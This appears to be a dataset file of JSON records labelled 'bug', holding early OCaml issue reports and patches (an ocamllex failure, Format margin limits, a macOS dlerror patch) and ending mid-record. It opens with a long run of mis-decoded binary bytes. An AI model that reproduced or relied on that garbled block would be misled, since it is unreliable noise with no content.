>[Â¢BÃÂª2F\\rvâkFÃÃ£VÂ½xÃ¶v'Ãwâ¹Â¨ÃÃª)e\u0000vÂ¹ÂµÂ·mÃ¶Ã·\u0012â Ã³.Â­Â¡sÂ°Ã\u001f0,mÂµ\u001dJâ¢\u001bÃ·tÃ¯Ã¤#Â©Ã¾ÃÃ¸â¡Ã¿\u0000CÂ§â¦?Ã°âÂ¸Ã¿\u0000Ã¤Ãº?Â±Â¾!Ã¿\u0000ÃÃ©Ã¡OÃ¼%.?Ã¹>Â¹kÂ¿?Ã?âj\u0017SÃ¸bÃÃ¬6Ãâ!ÃTc#ÃÃ©Ã\u0006\u000bÂ§Ãa\u0000JIÅÃ\u001eÃ¢Â¬\u000bnâ=Â£t:Å¸Ã­\u0001=âÂ¾ Å¾\u000f\u0007Ãª7Znâ\u001eÂ \u0012Ã©bÂ¹PÃ²ÃÂ¬Â¥Ã¼Ã\rÂ¿?âÂ³@Ã¨Â¬âHÃhÃ²â¬â\b|â¬Ã«Ã¿\u0000Â±Â¾!Ã¿\u0000ÃÃ©Ã¡OÃ¼%.?Ã¹>?Ã¬oËÃ´:xSÃ¿\u0000\tK?Ã¾OÂ­Ã\u001aÃªÃ¶Ã·MÅ Ã§QÃÃ¿\u0000Â³Â®$Ã\u001bc0â¢Â¢\\?Â¡â¢~]Ã»qÂ¸)e\r?\u0019Ã\fmÃÃ¦Ã²\u001dÅ½JÃ¯OÃ¸Æei5ÃÃ¸ÃÃÃ!ÅÂ»\u0005Ã°Â¤Ã¹ \fÃ±Ã¾Å¸MÃ¸9Ã£\rOÃÅ¸\u000fÂ¬ÂµÃa,ÃÃº[â¹Â¨e\u0016âÂ´q\u001f*Ã¦H?Ufb2#\u0007â<â]\u001eÂ»Ã¿\u0000 ;Ã¿\u0000ÃºÃ¶âÃ¿\u0000A5ÃÃ¾ÃÅ¸Ã²H4Ã¿\u0000Ã»\bj?Ãº_=\rÃ\u0001Ã©Ã³%Â´2Â´e%;N3Â¼â¦36Â¿Ã³ÃoÃ»Ã¬â¦\u0017Â¿Ã±Ã·/Ã»ÃÂ¡Â§-\u001d?\"lÃÃ¿\u0000Ã9Â¿Ã¯Â±Ã¾\u0014fÃÃ¾yÃÃ¿\u0000}?Ã°Â®GÃ¢Ã¦Â£Â¨Ã¨Â¿\u000bÂ¼OÂªÃ©\u001aÅÃvÂ¡Â§Ã©SÃ[ÃE\u001cnUÃ¢ÅÃ\u0006Ã\u0015âÆÂ·iÃÃ¨N\b8##QÃ¸â°Â«Ã¨W?ekÂ¥ÃÂªÃ©Ãº^Â«aÂ¢jZâ¦Ã¦Â¡Ã¤\\Â¼Ã·\u0006Ã\t\u0012\u0018Ã 1Â¸\u000bu\u0013\u001fÅ¡>wâ¬Â \u0000HÂ®Ã¶\r?EÃÂ¯Ã¼Ã³âºÃ¾Ã»\u001fÃ¡FmÃ§ÅÃÃ·ÃÃ¿\u0000\nÃ²?/Ã£vÂ§&â¡Â£j\u001aÂ·â ,Ã­fÃ±\u000e?\u0005Ã®?\u0015Â®Â¨ÃÂ«Ã¹Â³[BÂ«pÃ\nyX{Ã2PIÃ²â°\u000e\tU\u000fÂ¥Â¦Ã¼SÃÃ¯|amÃ¡\u0017Ã°Â¼?Ãâ¹$Ã©Â¨Â¼:âÃ«{Q\u0012ÃÃ]]Â£W?\u0018Â¯S\u001f >`Ã?âÃÂ¯â]â¦Â¡Ã¨Â¹ÂµÃ¿\u0000Å¾sÃcÃ¼(ÃÂ¯Ã¼Ã³âºÃ¾Ã»\u001fÃ¡^;Â¦~Ã\u0017zÅ¾â5X|\u000bÂ«ÃguÃ¶I4Ã¦XÃ§â¹ÃIÃ®`?UÃxbâJEÃÂ²Â¬rH?Â±Ã³\"Â¨\u000eÃÂ¯bÃ·2Y@Ã·Â°Ã\rÃFÂ¦hÃ¡âÃËÃ¸Ã¹âÂ±U,\u0001Ã\u0004ÂªÃ§ÃtÂ¤Ã[ÅÂ·âº_Ã¹Ã§7Ã½Ã¶?ÃÂ²|eÂ®'â¡<-Â¨ÃªâÃÃ­$ÃÃ\u0017?dâwAÅ\fÃ£'Â§\u001fQZ\u0015Ã|QÃ¿\u0000â}Â¬Ã¿\u0000ÃÂ¹Ã¾bâ¢ÃÃKE\u0014R\u0018QE\u0014\u0000QE\u0014\u0000QE\u0014\u0000QE\u0014\u0000QE\u0014\u0000QE\u0014\u0000QE\u0014\u0000QE\u0014\u00015Ã§ÃºÃ¿\u0000Ã¸\nÃ¿\u0000Ã¨\"Â¡Â©Â¯?ÃÃ¿\u0000ÃWÃ¿\u0000A\u0015\r\u0000\u0014QE\u0000\u0014QE\u0000\u0014QE\u0000\u0014QE\u0000\u0014QE\u0000\u0014QE\u0000\u0014QE\u0000\u0015Ãx6Ã¾ÃÃ]Ã±ÃÂºÂºâ\rÃ%MÂ¾d?s?.Ã8ÃÃW_\\?ËÂ¾\u0005x\u0017ÃZÃ­Ã¦Â¹Â©Ã©âÃzÃÃ\u0012AÂ«ÃÃÂ®U\u00165;#â¢T\u001dÂ¨Â£?ÃÅZB:ÃÃ­Ã+Ã¾âv_Ã·Ã½Ã?Ã­Ã+Ã¾âv_Ã·Ã½ÃÂ¸_Ã¸fÃâ¡\u001fÃ´\u000bÃÂ¿Ã°Â Â¿Ã¿\u0000Ã£ÃÃ6|8Ã¿\u0000Â ^Â­Ã¿\u0000â¦\u0005Ã¿\u0000Ã¿\u0000\u001eÂ£@:â¹ko\tÃi\u0017ZBIÂ¦>Å¸w%Ãâ\u0016Ã³LÂ²Â¤Â¦y\u001eIÆ\u0006'!Å¡G%z|ÃÃ8Â¬Ã­/ÃÅ¾\u0007ÃnÂ­Â¯\"Âº\u0013ÃÃ\\\u000bËÂ®Â¯uâ°nÂ¦V\u0011I\u0010\u001edÂ²3\u0014\t<ÃBvÆ#0\u0000âk#Ã¾\u0019Â³Ã¡ÃÃ½\u0002ÃµoÃ¼(/Ã¿\u0000Ã¸Ãµ\u001fÃ°ÃÅ¸\u000e?Ã¨\u0017Â«Ã¡AÃ¿\u0000ÃÂ¨Ã\r{Å¸\tx\nÃ²ÃÃ¢ÃqdÃÃ[ÃÃJÂ¿oaÂº;ÃDÂ·K?Ã¼op\u000eG+ÃvÅ½*\u001bÃ¿\u0000\u0003Ã¼>Ã%Â¿{Ã\u0004ÃÃÃ<s[6Â©'ÃÃÃVIÅ¾8|Ã.)\u001d^@Ã\"Â«Å¸2NrÃ­ÅÃ¯Ã¸fÃâ¡\u001fÃ´\u000bÃÂ¿Ã°Â Â¿Ã¿\u0000Ã£ÃÃ6|8Ã¿\u0000Â ^Â­Ã¿\u0000â¦\u0005Ã¿\u0000Ã¿\u0000\u001eÂ£@;Â¯Ã­Ã+Ã¾âv_Ã·Ã½Ã?Ã­Ã+Ã¾âv_Ã·Ã½ÃÂ¸_Ã¸fÃâ¡\u001fÃ´\u000bÃÂ¿Ã°Â Â¿Ã¿\u0000Ã£ÃÃ6|8Ã¿\u0000Â ^Â­Ã¿\u0000â¦\u0005Ã¿\u0000Ã¿\u0000\u001eÂ£@:Ã­kZÃ%ÃÂ¯c?PÂ´gkwUUâ¢I'iÃ\u00035ÃÃ¾ÃÅ¸Ã²H4Ã¿\u0000Ã»\bj?Ãº_=\u001fÃ°ÃÅ¸\u000e?Ã¨\u0017Â«Ã¡AÃ¿\u0000ÃÂ«Â²Ã°Â§â¦4Å¸\u0004h0hz\u001dÂ³ÃX[Â³Â´qÂ¼Ã)\u0005ÃÂ¤r]ÃbK3\u001eIÃ«F?\u0000ÃÂ½Ã¿\u0000?Â¹Ã5\rsâÃ¼6Ã°Ã¬Ã²Â´Â²Ã|Ã²9,ÃÃâ¢Ã,OROâ¢MÃ¿\u0000â¦cÃ¡Å¸Ã¹Ã´Â¼Ã¿\u0000Ã?ÃÃ¿\u0000\u0017CiÂ»â5<MÃ¡Â½7Ã\u001a\u0005Ã¦â¦Â«Ã4Âº}Ã¬~UÃq\\I\u0001â\u000fUÃ\u001b+`Ã´ \u001eA Ã¤\u0012+âÃ>\u000eCÂ«Ã¸âºKÂ¾â¡TÅ¡ÃMÂ³âÃÃ¢Ã¢ÃfÂºiÂ®Ã¦Â·uhÂ¤â¢ÃÃâ¢!Ã½Ã*Ã,2HU1Â¼\u0010â¦6Â¿Ã¡XÃ¸gÃ¾}/?Ã°cqÃ¿\u0000ÃÃÃ¿\u0000\nÃÃ?Ã³Ã©yÃ¿\u0000Æ\u001b?Ã¾.âÃ­Â°X{Ã¼5Ã°Â¼Å¡nâºÂ§6âÃ¾?Â¥Ã©ÃÃÂ¶ O kx3\u000b\u0000Â­Â»pukxYdÃÃµhÃV\u0007Å¡âDÃ°\u0016?Ã¡Ã«ÃoÂ¬m&Ã»d1Ã\u0018ÂºÅ¾Ã®YÃ¦?Jb/Ã¦I#3HOâ\b\fÃ¤â¢XÃA\n1UÃ¿\u0000Ã¡XÃ¸gÃ¾}/?Ã°cqÃ¿\u0000ÃÃÃ¿\u0000\nÃÃ?Ã³Ã©yÃ¿\u0000Æ\u001b?Ã¾.â¹â¦â ZÃ¼)Ã°?Â£f=6fTâ'â9ogâ-DS$Ã?+9X#\u0012E\u0011Ã²Ã£\nâ¡Ã@Tâ¦\u0000u\u0015ÃÃÂ±Ã°ÃÃ¼Ãº^Ã ÃÃ£Ã¿\u0000â¹Â£Ã¾\u0015?â Ã§ÃÃ³Ã¿\u0000\u00067\u001fÃ¼]+?ÃÃ5Ã±GÃ¾IÃ¶Â³Ã¿\u0000^Ã§Ã¹Å ?Ã¡XÃ¸gÃ¾}/?Ã°cqÃ¿\u0000ÃÃ?ÃÃ¯\u000bÃ?\u001bÃ]20Ã)Ã.\b#ÃÃ¯Ã3Â¦Â¢Å (\u0000Â¢Å (\u0000Â¢Å (\u0000Â¢Å (\u0000Â¢Å (\u0000Â¢Å (\u0000Â¢Å (\u0000Â¢Å (\u0000Â¢Å (\u0002kÃÃµÃ¿\u0000Ã°\u0015Ã¿\u0000ÃECS^Â¯Ã¿\u0000â¬Â¯Ã¾â*\u001a\u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000(Â¢Å \u0000Ã¿Ã----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 2053\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFurther to my previous post: there is actually a bug: the documentation \nsays that \"bigger than 999999999\" is ignored, but in fact greater than \n*or equal to* 999999999 is ignored.\n\n--KW 8-)\n-- \nKeith Wansbrough <kw217@cl.cam.ac.uk>\nhttp://www.cl.cam.ac.uk/users/kw217/\nUniversity of Cambridge Computer Laboratory.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2052\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi... I am using the Format module to pretty-print a term.  I want to \nhave the option to print it as a single long line in certain \ncircumstances, although usually the term will be printed with nice \nbreaks, to fit within a given margin.\n\nThe obvious way to do this is to set the margin to \"infinity\" - a very \nlarge value.\n\nHowever, the only way to do this is to say\n\nFormat.set_margin 999999999\n\nwhere it's *critical* that I get exactly the right number here: if it's \ntoo high, the documentation informs me that \"nothing happens\".  The \nliteral is therefore not just ugly, but also dangerous.\n\nI would rather say either\n\nFormat.set_margin max_int\n\nor\n\nFormat.set_margin Format.pp_infinity\n\nThis is therefore a request for either (a) Format.set_margin to treat \nvalues >999999999 as if they were requests for 999999999, rather than \nignoring; or (b) to export pp_infinity from Format.\n\nThanks..\n\n--KW 8-)\n-- \nKeith Wansbrough <kw217@cl.cam.ac.uk>\nhttp://www.cl.cam.ac.uk/users/kw217/\nUniversity of Cambridge Computer Laboratory.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2051\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nocamllex from ocaml 3.07+2 fails on the enclosed file with an error:\n\nFatal error: exception Assert_failure(\"lexgen.ml\", 1005, 10)\n\nocamllex from ocaml 3.06 does not report an error.\n\n----------------\n{\nopen Cssparse\n\nlet tail1 s = String.sub s 1 ((String.length s) - 1)\nand head1 s = String.sub s 0 ((String.length s) - 1)\nand inner s = String.sub s 1 ((String.length s) - 2)\n\nlet split_dimension s =\n  let div = ref 0\n  and len = String.length s\n  and num = (function '0' | '1' | '2' | '3' | '4' | '5' | '6' | '7' | '8' | '9' | '+' | '-' | '.' -> true | _ -> false) in\n  while !div < len && num s.[!div] do\n    incr div\n  done;\n  DIMENSION(float_of_string(String.sub s 0 !div), String.sub s !div (len - !div))\n\n(* Save space by sharing copies of the most common kewords. *)\n(* XXX CSS unquoted words are case-insensitive.  XML element names are\n   case-sensitive.  Is String.lowercase inappropriate for XML? *)\nlet intern s =\n  (match String.lowercase s with \"none\" -> \"none\" | \"normal\" -> \"normal\" | s -> s)\n\nlet doident lexeme =\n  let l = String.length lexeme in\n  if lexeme.[l-1] = '(' then FUNCTION(head1 lexeme) else IDENT(intern lexeme)\n\nlet donumber lexeme = \n  let l = String.length lexeme in\n  if lexeme.[l-1] = '%' then\n    PERCENTAGE(float_of_string(String.sub lexeme 0 (l-1)))\n  else\n    NUMBER(float_of_string lexeme)\n\nlet atkeyword lexeme =\n  begin match String.lowercase lexeme with\n    \"@import\" -> ATIMPORT\n  | \"@charset\" -> ATCHARSET\n  | \"@media\" -> ATMEDIA\n  | \"@page\" -> ATPAGE\n  | \"@font-face\" -> ATFONTFACE\n  | s -> ATKEYWORD(tail1 s)\n  end\n\nlet decode_unicode s =\n  let l = String.length s in\n  let rv = int_of_string (\"0x\" ^ (String.sub s 1 (l-1))) in\n  assert (rv >= 0 && rv < 256);\n  char_of_int rv\n\n(* XXX Skip whitespace? *)\nlet uri lexeme =\n  let l = String.length lexeme in\n  URI(String.sub lexeme 4 (l-5))\n}\nlet hex = [ '0' - '9' 'a' - 'f' ]\nlet HEX = [ '0' - '9' 'A' - 'F' ]\n(* Technically only 1-6 hex characters are allowed but the lex tables\n   are much smaller when + is used. *)\nlet css_unicode = '\\\\' (HEX | hex)+ ['\\n' '\\r' '\\t' '\\012']?\nlet css_escape = css_unicode | '\\\\' [ ' ' - '~' ] (* \\200-\\4177777 omitted *)\nlet css_nonascii =  [^ '\\000' - '\\255' ]\nlet css_nmstart = ['a' - 'z' 'A' - 'Z' ] | css_nonascii | css_unicode\nlet css_nmchar = ['a' - 'z' 'A' - 'Z' '0' - '9' '-' ] | css_nonascii | css_unicode\nlet css_name = css_nmchar +\nlet css_ident = css_nmstart css_nmchar*\nlet css_num = ['0' - '9']+ | ['0' - '9']* '.' ['0' - '9']+\nlet css_nl = '\\n' | '\\r' '\\n' | '\\r' | '\\012'\nlet css_string1 =  '\\034' ( [ '\\t' ' ' '!' '#' '$' '%' '&' '(' - '~' ] | '\\\\' css_nl | '\\'' | css_nonascii | css_escape )* '\\034'\nlet css_string2 =  '\\039' ( [ '\\t' ' ' '!' '#' '$' '%' '&' '(' - '~' ] | '\\\\' css_nl | '\\034' | css_nonascii | css_escape )* '\\039'\nlet css_string = css_string1 | css_string2\nlet css_w = [' ' '\\t' '\\r' '\\n' '\\012']*\nlet css_s = [' ' '\\t' '\\r' '\\n' '\\012']+\nlet css_comment = '/' '*' [^ '*']* '*'+ ([^ '/'][^ '*']* '*'+)* '/'\n\n(* The CSS spec defines a grammar which allows just about any combination\n   of tokens and advises against using the real grammar in appendix D. *)\n\nrule css =\n  parse\n    (* Skip over CDO, CDC, and comments. *)\n    \"<!--\" | \"-->\" | css_comment | css_s { css lexbuf } |\n    '#' css_name { HASH(tail1(Lexing.lexeme lexbuf)) } |\n    '@' css_ident{ atkeyword(Lexing.lexeme lexbuf) } |\n    css_ident '('? { doident (Lexing.lexeme lexbuf) } |\n    (* XXX String processing: strip quotes; delete backslash-newline *)\n    css_string { STRING(inner(Lexing.lexeme lexbuf)) } |\n    ['+' '-']? css_num '%'? { donumber(Lexing.lexeme lexbuf) } |\n    ['+' '-']? css_num css_ident { split_dimension(Lexing.lexeme lexbuf) } |\n    (* XXX Should be case-insentive? *)\n    \"url(\" css_w css_ident css_w ')' |\n    \"url(\" css_w (['!' '#' '$' '%' '&' - '~' ] | css_nonascii | css_escape) css_w ')' { uri(Lexing.lexeme lexbuf) } |\n    \"U+\" (HEX | '?')+ ('-' HEX+)? { UNICODE(0,0) } |\n    '*' { STAR } |\n    '.' { DOT } |\n    ',' { COMMA } |\n    '+' { PLUS } |\n    '[' { LSQUARE } |\n    ']' { RSQUARE } |\n    ':' { COLON } |\n    '>' { CHILD } |\n    '{' { LBRACE } |\n    '}' { RBRACE } |\n    ';' { SEMICOLON } |\n    '=' { EQUALS } |\n    '(' { LPAREN } |\n    ')' { RPAREN } |\n    '/' { SLASH } |\t(* Only in font: line-height declaration *)\n    '!' { EXCLAMATION } |(* Only followed by \"important\" *)\n    (* XXX Parentheses? *)\n    (*css_s { Space } |*)\n    \"~=\" { CONTAINS } |\n    \"|=\" { PREFIX } |\n    _ { ERROR((Lexing.lexeme lexbuf).[0]) } |\n    eof { EOF }\n\n\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 2048\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nSi on dÃ©finit:\n   module type S = sig type t = private A | B end\n\nAlors:\n   module A : S = struct type t = A | B type s = t end\nmarche bien\n\nMais:\n   module A : S = struct type s = A | B type t = s end;;\nÃ©choue avec:\n\nSignature mismatch:\nModules do not match: sig type s = A | B and t = s end is not included in S\nType declarations do not match:\n  type t = s\nis not included in\n  type t = private A | B\n\n\nC'est un peu surprenant, ce sous-typage qui n'est pas invariant par\negalitÃ©, mÃªme si Ã§a peut se comprendre. Est-ce un bug ?\n\n\n  Alain\n"},{"labels":["bug"],"text":"**Original bug ID:** 2047\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Aleksey Nogin\nVersion: CVS from Jan 17, 2004\nOS: Fedora Core Development (AKA RawHide).\nSubmission from: charter-242-037.caltech.edu (131.215.242.37)\n\n\nI just got a reproducible crash in caml_oldify_mopup:\n\n(gdb) bt\n#0  0x0000000000ac5757 in caml_oldify_mopup ()\n#1  0x0000000000ac5858 in caml_empty_minor_heap ()\n#2  0x0000000000ac591a in caml_minor_collection ()\n#3  0x0000000000ac42ad in caml_garbage_collection ()\n#4  0x0000000000ad0d89 in caml_call_gc ()\n#5  0x4157782bc0000000 in ?? ()\n#6  0x3f97af99f4893e68 in ?? ()\n\nNot sure what can be done to debug it further.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2046\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Yamagata Yoriyuki\nVersion: 3.07\nOS: Linux\nSubmission from: p25044-adsau12honb7-acca.tokyo.ocn.ne.jp (220.99.29.44)\n\n\n$ ocamlmklib -o foo/bar foo/bar.cmo foo/bar.cmx foo/barstub.o\n\ntries to create dllfoo/bar.so and fails.  It would be nice if subdirectories are\nrecognized.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2045\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Yamagata Yoriyuki\nVersion: 3.07\nOS: Linux\nSubmission from: p25044-adsau12honb7-acca.tokyo.ocn.ne.jp (220.99.29.44)\n\n\nSay, there are two files in tmp dir.\n\n$ ls tmp\ntest.c test.ml\n\n$ ocamlc -c tmp/test.ml\n\nproduces tmp/test.cmo while\n\n$ ocamlc -c tmp/test.c\n\nproduces test.o in the current directory.  There may be a reason fot this, but\nthis is confusing.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2036\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Holger Dell\nVersion: OCaml-3.07p2\nOS: Windows/Cygwin (sorry)\nSubmission from: p508ae11c.dip.t-dialin.net (80.138.225.28)\n\n\nHi,\nI am using Vim 6.2 and got a problem with the file\nhttp://www.ai.univie.ac.at/~markus/ocaml_sources/ocaml.vim\n(link can be found at http://www.ocaml.org).\n\nthe syntax highlighting doesn't work correctly.\nif you have the following code:\n\nlet xs = [1; 2; 3] in\nlet f x = false in\nlet x = List.for_all f xs\nand b = \"foo\"\n\nthe syntax-highlighting thinks \"for\" is the beginning of a \"for\"-loop, so the\nsyntax highlighting after that point doesn't work correctly.\nand i think that's because the vim-script treats \"_\" like a whitespace, and that\nis obviously incorrect.\n\nthe problem is not only with \"for\", it also happens with \"begin\" or \"open\" as\nwell.\nit's not a serios bug, but it is annoying, please fix that.\n\nthank you.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2035\n**Reporter:** administrator\n**Status:** closed (set by @damiendoligez on 2007-12-12T15:19:58Z)\n**Resolution:** unable to duplicate\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n**Related to:** #8384 #8385\n\n## Bug description\n\nI'm sorry to bug you. I would like to know if there is any news on the \r\ntypechecking bug my code has exposed (bug reports 1943-1944). Is there \r\nanything I can do to help spot and fix it?\r\n\r\nAlex\n"},{"labels":["bug"],"text":"**Original bug ID:** 2031\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi,\n\nWe've upgraded to ocaml 3.07 from 3.04 and we've noticed that camlidl\ndoes not work with this new version....it raises an exception.   We\ncannot even just run \"camlidl\" from the command line with no options.\nIs there a known fix or workaround that we can use?  Is this a known\nproblem?  Thanks for your time!\n\n- Byron\n\n\n\nPS.....\n\nHere's what we see with 3.07\n    $ ocaml\n            Objective Caml version 3.07+2\n\n    # ^D\n    $ camlidl -help\n    Fatal error: exception Invalid_argument(\"Filename.chop_extension\")\n    $\n\n\n\n\n\nHere's what we see with 3.04\n    $ ocaml\n            Objective Caml version 3.04\n\n    # ^D\n    $ camlidl -help\n    Usage: camlidl [options]<.idl file> ... <.idl file>\n    Options are:\n\n      -I <dir>  Add directory to search path\n    .\n    .\n    .\n    .\n    $\n\n\nThanks again....\n"},{"labels":["bug"],"text":"**Original bug ID:** 2030\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Aleksey Nogin\nVersion: 3.06 and 3.07+13 (2004-01-04)\nOS: Red Hat Linix 7.3 and 9.0\nSubmission from: wasco.cs.caltech.edu (131.215.44.173)\n\n\nCompare the following two testcases:\n\n% cat temp1.ml ; ocamlc -g temp1.ml ; env OCAMLRUNPARAM=b ./a.out\nlet h () = raise Not_found\nlet _ = h ()\nFatal error: exception Not_found\nRaised at file \"temp1.ml\", line 1, character 26\nCalled from file \"temp1.ml\", line 2, character 12\n\n% cat temp2.ml ; ocamlc -g temp2.ml ; env OCAMLRUNPARAM=b ./a.out\nlet f x = x + 1\nlet g x = x + 2\nlet h () = (f = g)\nlet _ = h ()\nFatal error: exception Invalid_argument(\"equal: functional value\")\nRaised by primitive operation at file \"temp2.ml\", line 4, character 12\n\n% ocamlc -version\n3.07+13 (2004-01-04)\n\nIn the first testcase, the backtrace correctly has two frames, but in the second\ncase, the innermost frame is omited - the backtrace claims that the C function\nwas called from line 4, while in fact is was called from line 3. \n\nP.S. If I have a longer h with the offending call somwhere in the middle (to\nrule out inlining, tail-call optimizations, etc), or if I use 3.06, I still get\nsimilar results.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2029\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Paul Guyot\nVersion: 3.07pl2\nOS: MacOS X\nSubmission from: fremicourt.kallisys.net (82.66.90.159)\n\n\ncaml_dlerror ne dit pas quelle est la bibliothÃ¨que (enfin, le bundle MacOS X)\nqui Ã©choue.\n\nVoici une rustine pour corriger le problÃ¨me:\n\n----<\nIndex: unix.c\n===================================================================\nRCS file: /caml/ocaml/byterun/unix.c,v\nretrieving revision 1.21\ndiff -u -r1.21 unix.c\n--- unix.c      2004/01/03 20:55:41     1.21\n+++ unix.c      2004/01/07 23:40:30\n@@ -168,34 +168,52 @@\n #ifdef HAS_NSLINKMODULE\n /* Use MacOSX bundles */\n \n-static char *dlerror_string = \"No error\";\n+static char *dlerror_string = NULL;\n \n void * caml_dlopen(char * libname)\n {\n   NSObjectFileImage image;\n+  char* theMessage = NULL;\n   NSObjectFileImageReturnCode retCode =\n     NSCreateObjectFileImageFromFile(libname, &image);\n+  if (dlerror_string != NULL)\n+  {\n+    free( dlerror_string );\n+    dlerror_string = NULL;\n+  }\n   switch (retCode) {\n   case NSObjectFileImageSuccess:\n     dlerror_string = NULL;\n     return (void*)NSLinkModule(image, libname, NSLINKMODULE_OPTION_BINDNOW\n                               | NSLINKMODULE_OPTION_RETURN_ON_ERROR);\n   case NSObjectFileImageAccess:\n-    dlerror_string = \"cannot access this bundle\"; break;\n+    theMessage = \"cannot access this bundle\"; break;\n   case NSObjectFileImageArch:\n-    dlerror_string = \"this bundle has wrong CPU architecture\"; break;\n+    theMessage = \"this bundle has wrong CPU architecture\"; break;\n   case NSObjectFileImageFormat:\n   case NSObjectFileImageInappropriateFile:\n-    dlerror_string = \"this file is not a proper bundle\"; break;\n+    theMessage = \"this file is not a proper bundle\"; break;\n   default:\n-    dlerror_string = \"could not read object file\"; break;\n+    theMessage = \"could not read object file\"; break;\n   }\n+  if (theMessage != NULL)\n+  {\n+    size_t theLength;\n+    theLength = strlen( theMessage ) + strlen( libname ) + 4;\n+         /* space, (, ), terminator */\n+    dlerror_string = malloc(theLength);\n+    (void) sprintf( dlerror_string, \"%s (%s)\", theMessage, libname );\n+  }\n   return NULL;\n }\n \n void caml_dlclose(void * handle)\n {\n-  dlerror_string = NULL;\n+  if (dlerror_string != NULL)\n+  {\n+    free( dlerror_string );\n+    dlerror_string = NULL;\n+  }\n   NSUnLinkModule((NSModule)handle, NSUNLINKMODULE_OPTION_NONE);\n }\n \n@@ -204,7 +222,11 @@\n   NSSymbol sym;\n   char _name[1000] = \"_\";\n   strncat (_name, name, 998);\n-  dlerror_string = NULL;\n+  if (dlerror_string != NULL)\n+  {\n+    free( dlerror_string );\n+    dlerror_string = NULL;\n+  }\n   sym = NSLookupSymbolInModule((NSModule)handle, _name);\n   if (sym != NULL) return NSAddressOfSymbol(sym);\n   else return NULL;\n----<\n\nPaul\n"},{"labels":["bug"],"text":"**Original bug ID:** 2027\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Damien Doligez\nVersion: 3.07+13\nOS: Mac OS X\nSubmission from: www-rocqbis.inria.fr (192.93.2.12)\n\n\nUn parsing trop laxiste de camlp4, qui declenche un message d'erreur\nincomprehensible de la part du typeur.  A qui la faute ?\n\n---- fichier foo.mli\nval foo : pervasives.list\n----\n\ncompilation:\n$ ocamlc -pp camlp4o -c foo.mli\nWrong file naming: /usr/local/lib/ocaml/pervasives.cmi\ncontains the compiled interface for Pervasives\n\nSi on compile sans preprocesseur, on a une erreur de syntaxe.\n\n-- Damien\n"},{"labels":["bug"],"text":"**Original bug ID:** 2025\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nOn Sat, 27 Dec 2003, Damien Doligez wrote:\n\n> This bug is in fact in the ML part of the Num library, which is common\n> to both the old and new Num implementations.  I think it dates back to\n> Caml Light.\n(...)\n> This \"nondeterminism\" comes from using a Nat.nat with an uninitialised\n> digit, using whatever was already in memory at that address.\n\nMany thanks for your prompt action. (By the way, ocaml is a very nice tool \nfor certain kinds of calculations in Superstring/M-Theory - see \nhttp://arxiv.org/abs/hep-th/0312262 .)\n\n-- \nregards,               tf@cip.physik.uni-muenchen.de              (o_\n Thomas Fischbacher -  http://www.cip.physik.uni-muenchen.de/~tf  //\\\n(lambda (n) ((lambda (p q r) (p p q r)) (lambda (g x y)           V_/_\n(if (= x 0) y (g g (- x 1) (* x y)))) n 1))                  (Debian GNU)\n"},{"labels":["bug"],"text":"**Original bug ID:** 2024\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** 